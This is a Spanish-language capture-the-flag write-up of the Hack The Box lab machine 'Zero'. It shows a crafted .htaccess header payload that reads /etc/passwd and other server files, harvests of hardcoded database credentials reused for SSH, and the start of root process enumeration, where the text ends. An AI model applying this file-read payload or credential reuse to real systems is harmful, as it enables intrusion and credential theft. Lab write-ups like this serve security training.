---
tags:
title: Zero - Insane (HTB)
toc: true
permalink: /Zero-HTB-Writeup
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
![image-center](/assets/images/Pasted image 20260224154718.png)

# Recon

```bash
nmapf 10.129.234.62
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 12:13 -0500
Initiating Ping Scan at 12:13
Scanning 10.129.234.62 [4 ports]
Completed Ping Scan at 12:13, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:13
Completed Parallel DNS resolution of 1 host. at 12:13, 0.50s elapsed
Initiating SYN Stealth Scan at 12:13
Scanning 10.129.234.62 [65535 ports]
Discovered open port 22/tcp on 10.129.234.62
Discovered open port 80/tcp on 10.129.234.62
Completed SYN Stealth Scan at 12:13, 8.92s elapsed (65535 total ports)
Nmap scan report for 10.129.234.62
Host is up, received echo-reply ttl 63 (0.35s latency).
Scanned at 2026-02-24 12:13:47 EST for 9s
Not shown: 61687 closed tcp ports (reset), 3846 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
           Raw packets sent: 82208 (3.617MB) | Rcvd: 70277 (2.884MB)
-e [*] IP: 10.129.234.62
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 12:13 -0500
Nmap scan report for 10.129.234.62
Host is up (0.70s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 85:7b:10:68:1b:90:b6:10:52:57:f1:a9:fd:18:eb:6c (RSA)
|   256 2e:61:8d:35:14:d6:92:3a:71:74:f7:80:ba:76:21:f3 (ECDSA)
|_  256 d0:8b:7d:83:72:24:9c:b7:8f:bf:78:f9:16:05:8b:d9 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Page moved.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.30 seconds
```

## Website

La pagina principal hostea un generador de paginas HTML vía `sftp`.


![image-center](/assets/images/Pasted image 20260224141410.png)
### SFTP credentials

Donde en el mismo mensaje de la pagina muestra que contienen esa sección.

![image-center](/assets/images/Pasted image 20260224141459.png)

Si clickeo en `Sign up today`, veo que me redirigió a la siguiente pagina, donde puedo clickear en `Request Credentials.`
![image-center](/assets/images/Pasted image 20260224141527.png)

Y luego de clickear ahí, veo que me genera unas credenciales para el protocolo `sftp`.

![image-center](/assets/images/Pasted image 20260224141632.png)

Además si presiono en `Here` me redirige a mi propia web en donde puedo empezar a generar contenido en dicha pagina.

![image-center](/assets/images/Pasted image 20260224141944.png)
## Shell as zroadmin
### sftp access

Use las mismas para conectarme por dicho protocolo usando `sftp`.

```bash
sftp zro-28e3852a@zero.vl
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
zro-28e3852a@zero.vl's password:
Connected to zero.vl.
sftp>
```
### .htaccess malicious file

Viendo que en dicho lugar hay una carpeta `public_html`. Y dentro de la misma el index, junto con un `.htaccess`

```bash
sftp> ls
public_html
sftp> cd public_html/
ls
sftp> ls
index.html
sftp> ls -la
drwxr-xr-x    2 1004     1004         4096 Feb 24 17:41 .
drwxr-xr-x    3 root     root         4096 Feb 24 17:41 ..
-rw-r--r--    1 root     root           49 Feb 24 17:41 .htaccess
-rw-r--r--    1 1004     1004          349 Feb 15  2019 index.html
```

El mismo me lo baje para visualizar su contenido.

```bash
sftp> get .htaccess
```

Viendo el contenido del mismo veo que aplica la cabecera de respuesta `zro-eceed57c`.

```bash
$ cat .htaccess
Header always set X-Zero-Customer 'zro-eceed57c'
```
### Check header

Lo mismo se puede verificar enviando con `curl` la petición a la pagina.

```bash
curl -I http://zero.vl/~zro-eceed57c/
HTTP/1.1 200 OK
Date: Tue, 24 Feb 2026 17:52:35 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Zero-Customer: zro-eceed57c
Last-Modified: Fri, 15 Feb 2019 21:03:16 GMT
ETag: "15d-581f51a8d6d00"
Accept-Ranges: bytes
Content-Length: 349
Vary: Accept-Encoding
```
### Exfiltrate data

Para poder aprovechar el propio archivo y poder exfiltrar datos, encontré la [pagina oficial de Apache](https://httpd.apache.org/docs/current/expr.html), en donde se muestran todas las expresiones que se pueden usar en un archivo `.htaccess`.

En la misma muestra como puedo usar el `mod_header` -> `expr=%` para poder leer datos y colocar los mismos en la cabecera que voy a asignar la cual quedaría algo como:

```bash
Header always set X-Zero-Customer 'zro-eceed57c'
Header set X-testing "expr=%bla bla bla"
```

Luego para poder exfiltrar datos puedo usar la propia función `base64` junto con `file://` para poder leer archivos y exfiltrar la data en base64 en la cabecera que asigne, con todo esto dicho mi archivo quedo asi.

```bash
Header always set X-Zero-Customer 'zro-eceed57c'
Header set X-Test "expr=%{base64:%{file:/etc/passwd}}"
```

Luego de eliminar el archivo y volver a subirlo con `put`, envié mi petición con `curl`, viendo en la cabecera `X-Test` la data en `base64`.

```bash
curl -I http://zero.vl/~zro-eceed57c/
HTTP/1.1 200 OK
Date: Tue, 24 Feb 2026 17:52:35 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Zero-Customer: zro-eceed57c
Last-Modified: Fri, 15 Feb 2019 21:03:16 GMT
ETag: "15d-581f51a8d6d00"
Accept-Ranges: bytes
Content-Length: 349
Vary: Accept-Encoding
X-Test: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDk6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpsYW5kc2NhcGU6eDoxMTA6MTE1OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTExOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKbXlzcWw6eDoxMTM6MTE5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQplYzItaW5zdGFuY2UtY29ubmVjdDp4OjExMjo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgp1YnVudHU6eDoxMDAwOjEwMDA6VWJ1bnR1Oi9ob21lL3VidW50dTovYmluL2Jhc2gKenJvYWRtaW46eDo2NjY6NjY2OjovaG9tZS96cm9hZG1pbjovYmluL2Jhc2gKZnd1cGQtcmVmcmVzaDp4OjExNDoxMjE6Znd1cGQtcmVmcmVzaCB1c2VyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpfbGF1cmVsOng6OTk3Ojk5Nzo6L3Zhci9sb2cvbGF1cmVsOi9iaW4vZmFsc2UKenJvLTI4ZTM4NTJhOng6MTAwMToxMDAxOjovaG9tZS96cm8tMjhlMzg1MmE6L2Jpbi9mYWxzZQp6cm8tMDkzZWEyNTM6eDoxMDAyOjEwMDI6Oi9ob21lL3pyby0wOTNlYTI1MzovYmluL2ZhbHNlCnpyby00YzZmNGU0OTp4OjEwMDM6MTAwMzo6L2hvbWUvenJvLTRjNmY0ZTQ5Oi9iaW4vZmFsc2UKenJvLWVjZWVkNTdjOng6MTAwNDoxMDA0OjovaG9tZS96cm8tZWNlZWQ1N2M6L2Jpbi9mYWxzZQo=
Content-Type: text/html
```
### Decode

Decodificando la misma veo el contenido del `/etc/passwd` y al usuario `zroadmin` juntos con los demas usuarios que se crean para poder acceder a `sftp`.

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Z<SNIP>" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zroadmin:x:666:666::/home/zroadmin:/bin/bash
fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
zro-28e3852a:x:1001:1001::/home/zro-28e3852a:/bin/false
zro-093ea253:x:1002:1002::/home/zro-093ea253:/bin/false
zro-4c6f4e49:x:1003:1003::/home/zro-4c6f4e49:/bin/false
zro-eceed57c:x:1004:1004::/home/zro-eceed57c:/bin/false
```
### Assets files

Volví a editar mi archivo para poder saber cual es la ruta definida en donde corre la web.

```bash
cat .htaccess
Header always set X-Zero-Customer 'zro-eceed57c'
Header set X-Apache-Path "expr=%{DOCUMENT_ROOT}"
Header set X-Server-Name "expr=%{SERVER_NAME}"
```

Y enviando la petición, veo que es `/var/www/html`.

```bash
curl -I http://zero.vl/~zro-eceed57c/
HTTP/1.1 200 OK
Date: Tue, 24 Feb 2026 17:55:59 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Zero-Customer: zro-eceed57c
Last-Modified: Fri, 15 Feb 2019 21:03:16 GMT
ETag: "15d-581f51a8d6d00"
Accept-Ranges: bytes
Content-Length: 349
Vary: Accept-Encoding
X-Apache-Path: /var/www/html
X-Server-Name: zero.vl
Content-Type: text/html
```
### Credential leakage

Cargando el contenido del `index.php`, no vi mucho contenido del `backend`, por lo que puedo intuir que archivos que puedan tener la lógica de conexión de bases de datos, pueden ser el `config.php, stats.php, settings.php, .env, etc`, en donde solo en el `stats.php` veo lo siguiente.

```bash
echo  PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIj4KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iTWFyayBPdHRvLCBKYWNvYiBUaG9ybnRvbiwgYW5kIEJvb3RzdHJhcCBjb250cmlidXRvcnMiPgogICAgPG1ldGEgbmFtZT0iZ2VuZXJhdG9yIiBjb250ZW50PSJKZWt5bGwgdjMuOC41Ij4KICAgIDx0aXRsZT5aZXJvPC90aXRsZT4KCiAgICA8IS0tIEJvb3RzdHJhcCBjb3JlIENTUyAtLT4KICAgIDxsaW5rIGhyZWY9Ii9kaXN0L2Nzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj4KCiAgICA8c3R5bGU+CiAgICAgIC5iZC1wbGFjZWhvbGRlci1pbWcgeyBmb250LXNpemU6IDEuMTI1cmVtOyB0ZXh0LWFuY2hvcjogbWlkZGxlOyAtd2Via2l0LXVzZXItc2VsZWN0OiBub25lOyAtbW96LXVzZXItc2VsZWN0OiBub25lOyAtbXMtdXNlci1zZWxlY3Q6IG5vbmU7IHVzZXItc2VsZWN0OiBub25lOyB9CiAgICAgIEBtZWRpYSAobWluLXdpZHRoOiA3NjhweCkgeyAuYmQtcGxhY2Vob2xkZXItaW1nLWxnIHsgZm9udC1zaXplOiAzLjVyZW07IH0gfQogICAgPC9zdHlsZT4KICAgIDwhLS0gQ3VzdG9tIHN0eWxlcyBmb3IgdGhpcyB0ZW1wbGF0ZSAtLT4KICAgIDxsaW5rIGhyZWY9ImNhcm91c2VsLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8aGVhZGVyPgogIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLW1kIG5hdmJhci1kYXJrIGZpeGVkLXRvcCBiZy1kYXJrIj4KICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9Ii9pbmRleC5waHAiPlplcm88L2E+CiAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyQ29sbGFwc2UiIGFyaWEtY29udHJvbHM9Im5hdmJhckNvbGxhcHNlIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSIgYXJpYS1sYWJlbD0iVG9nZ2xlIG5hdmlnYXRpb24iPgogICAgICA8c3BhbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXItaWNvbiI+PC9zcGFuPgogICAgPC9idXR0b24+CiAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZiYXJDb2xsYXBzZSI+CiAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBtci1hdXRvIj4KICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIGFjdGl2ZSI+PGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIvaW5kZXgucGhwIj5Ib21lPHNwYW4gY2xhc3M9InNyLW9ubHkiPihjdXJyZW50KTwvc3Bhbj48L2E+PC9saT4KICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9zdGF0cy5waHAiPlN0YXRpc3RpY3M8L2E+PC9saT4KICAgICAgPC91bD4KICAgIDwvZGl2PgogIDwvbmF2Pgo8L2hlYWRlcj4KCjxtYWluIHJvbGU9Im1haW4iPgoKICA8IS0tIE1hcmtldGluZyBtZXNzYWdpbmcgYW5kIGZlYXR1cmV0dGVzCiAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gLS0+CiAgPCEtLSBXcmFwIHRoZSByZXN0IG9mIHRoZSBwYWdlIGluIGFub3RoZXIgY29udGFpbmVyIHRvIGNlbnRlciBhbGwgdGhlIGNvbnRlbnQuIC0tPgoKICA8ZGl2IGNsYXNzPSJjb250YWluZXIgbWFya2V0aW5nIj4KCiAgICA8IS0tIFNUQVJUIFRIRSBGRUFUVVJFVFRFUyAtLT4KICAgIDxociBjbGFzcz0iZmVhdHVyZXR0ZS1kaXZpZGVyIj4KCiAgICA8ZGl2IGNsYXNzPSJyb3cgZmVhdHVyZXR0ZSI+CiAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC03Ij4KICAgICAgICA8aDIgY2xhc3M9ImZlYXR1cmV0dGUtaGVhZGluZyI+U3RhdGlzdGljcy48c3BhbiBjbGFzcz0idGV4dC1tdXRlZCI+IDErMSE8L3NwYW4+PC9oMj4KCTw/cGhwCgkJJG15c3FsaSA9IG5ldyBteXNxbGkoImxvY2FsaG9zdCIsICJ6cm9hZG1pbiIsICJjb3JyZWN0LWhvcnNlLWJhdHRlcnktc3RhcGxlIiwgInpybyIpOwoJCSRyZXN1bHQgPSAkbXlzcWxpLT5xdWVyeSgiU0VMRUNUICogRlJPTSBzdGF0cyBMSU1JVCAxIik7CgkJZm9yICgkcm93X25vID0gJHJlc3VsdC0+bnVtX3Jvd3MgLSAxOyAkcm93X25vID49IDA7ICRyb3dfbm8tLSkgewoJCQkkcmVzdWx0LT5kYXRhX3NlZWsoJHJvd19ubyk7CgkJCSRyb3cgPSAkcmVzdWx0LT5mZXRjaF9hc3NvYygpOwoJCQlwcmludCgiPGJyPlJlZ2lzdGVyZWQgdXNlcnM6IDxiPiIuJHJvd1snbnVtdXNlciddLiI8L2I+CgkJCTxicj5OdW1iZXIgb2YgcGFnZXMgaG9zdGVkOiA8Yj4iLiRyb3dbJ251bXBhZ2VzJ10uIjwvYj4KCQkJPGJyPk51bWJlciBvZiBvcGVuIHdlYiBzb2NrZXRzOiA8Yj4iLiRyb3dbJ251bXNvY2tzJ10uIjwvYj4KCQkJPGJyPlN5c3RlbSBsb2FkIGF2ZXJhZ2U6IDxiPiIuJHJvd1snc3lzbG9hZCddLiI8L2I+CgkJCTxicj5TeXN0ZW0gdXB0aW1lOiA8Yj4iLiRyb3dbJ3VwdGltZSddLiI8L2I+CgkJCTxicj5OdW1iZXIgb2YgYWRtaW5zIGxvZ2dlZCBpbjogPGI+Ii4kcm93WydudW1hZG0nXS4iPC9iPiIpOwoJCX0KCT8+Cgk8cCBjbGFzcz0ibGVhZCI+PD9waHAgaW5jbHVkZSgnc3RhdHMuaW4udHh0JykgPz48L3A+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNSI+CiAgICAgICAgPGltZyBzcmM9ImRpc3QvaW1nL2FjY291bnQtY2FsY3VsYXRlLWNhbGN1bGF0aW5nLTIyMDMwMS5qcGciIHdpZHRoPSI0MDAiIGhlaWdodD0iNDAwIj48dGl0bGU+Q2FsYzwvdGl0bGU+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPGhyIGNsYXNzPSJmZWF0dXJldHRlLWRpdmlkZXIiPgoKICA8L2Rpdj48IS0tIC8uY29udGFpbmVyIC0tPgoKICA8IS0tIEZPT1RFUiAtLT4KICA8Zm9vdGVyIGNsYXNzPSJjb250YWluZXIiPgogICAgPHAgY2xhc3M9ImZsb2F0LXJpZ2h0Ij48YSBocmVmPSIjIj5CYWNrIHRvIHRvcDwvYT48L3A+CiAgICA8cD4mY29weTsgMjAyMiBaZXJvLCBEZWMuICZtaWRkb3Q7IDxhIGhyZWY9IiMiPlByaXZhY3k8L2E+ICZtaWRkb3Q7IDxhIGhyZWY9IiMiPlRlcm1zPC9hPiAmbWlkZG90OyA8YSBocmVmPSJhdHRyaWJ1dGlvbi5waHAiPkF0dHJpYnV0aW9uPC9hPjwvcD4KICA8L2Zvb3Rlcj4KPC9tYWluPgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMy4xLnNsaW0ubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1xOGkvWCs5NjVEek8wclQ3YWJLNDFKU3RRSUFxVmdSVnpwYnpvNXNtWEtwNFlmUnZIKzhhYnRURTFQaTZqaXpvIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgPHNjcmlwdD53aW5kb3cualF1ZXJ5IHx8IGRvY3VtZW50LndyaXRlKCc8c2NyaXB0IHNyYz0iL2RvY3MvNC4zL2Fzc2V0cy9qcy92ZW5kb3IvanF1ZXJ5LXNsaW0ubWluLmpzIj48XC9zY3JpcHQ+Jyk8L3NjcmlwdD48c2NyaXB0IHNyYz0iZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+PC9ib2R5Pgo8L2h0bWw+Cg== | base64 -d
<!doctype html>
<html lang="en">
<SNIP>
		$mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");
		$result = $mysqli->query("SELECT * FROM stats LIMIT 1");
		for ($row_no = $result->num_rows - 1; $row_no >= 0; $row_no--) {
			$result->data_seek($row_no);
			$row = $result->fetch_assoc();
			print("<br>Registered users: <b>".$row['numuser']."</b>
			<br>Number of pages hosted: <b>".$row['numpages']."</b>
			<br>Number of open web sockets: <b>".$row['numsocks']."</b>
			<br>System load average: <b>".$row['sysload']."</b>
			<br>System uptime: <b>".$row['uptime']."</b>
			<br>Number of admins logged in: <b>".$row['numadm']."</b>");
		}
	?>
<SNIP>
```
### Shell

Las mismas credenciales filtradas en dicho archivo, eran validas para ese usuario en `ssh`.

```bash
ssh zroadmin@zero.vl
<SNIP>
zroadmin@zero:~$ cat user.txt
04c51...
```
## Shell as root
### Proccess

Viendo los procesos con `pspy`, veo que se ejecuta continuamente, aproximadamente cada 1 minuto el script `/usr/local/bin/zro.web-confcheck`.

```bash
2026/02/24 18:12:46 CMD: UID=0     PID=7816   | /usr/bin/bash /usr/local/bin/zro.web-confcheck
2026/02/24 18:12:46 CMD: UID=0     PID=7817   | /usr/bin/pgrep -lfa ^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf
2026/02/24 18:12:57 CMD: UID=0     PID=7819   | /sbin/init
2026/02/24 18:12:57 CMD: UID=0     PID=7825   | /usr/lib/snapd/snap-seccomp version-info
2026/02/24 18:13:01 CMD: UID=0     PID=7841   | /usr/sbin/CRON -f
2026/02/24 18:13:01 CMD: UID=0     PID=7840   | /usr/sbin/cron -f
2026/02/24 18:13:01 CMD: UID=0     PID=7839   | /usr/sbin/CRON -f
2026/02/24 18:13:01 CMD: UID=0     PID=7843   | /usr/sbin/CRON -f
2026/02/24 18:13:01 CMD: UID=0     PID=7842   | /usr/sbin/CRON -f
2026/02/24 18:13:01 CMD: UID=0     PID=7844   | /bin/sh -c /root/bin/create-account.sh       >/dev/null 2>&1
2026/02/24 18:13:01 CMD: UID=0     PID=7845   | /usr/sbin/CRON -f
2026/02/24 18:13:01 CMD: UID=0     PID=7846   | /bin/sh -c /root/bin/cleanup.py              >/dev/null 2>&1
2026/02/24 18:13:01 CMD: UID=0     PID=7850   | /bin/bash /root/bin/create-account.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7849   | /bin/bash /root/bin/create-account.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7848   | /bin/bash /root/bin/create-account.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7847   | /bin/bash /root/bin/create-account.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7851   | /bin/sh -c /root/bin/update-stats.sh         >/dev/null 2>&1
2026/02/24 18:13:01 CMD: UID=0     PID=7853   |
2026/02/24 18:13:01 CMD: UID=0     PID=7854   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7856   |
2026/02/24 18:13:01 CMD: UID=0     PID=7855   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7857   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7858   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7859   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7862   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7861   | /usr/bin/uptime -p
2026/02/24 18:13:01 CMD: UID=0     PID=7860   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7863   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7866   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7865   | /bin/bash /root/bin/update-stats.sh
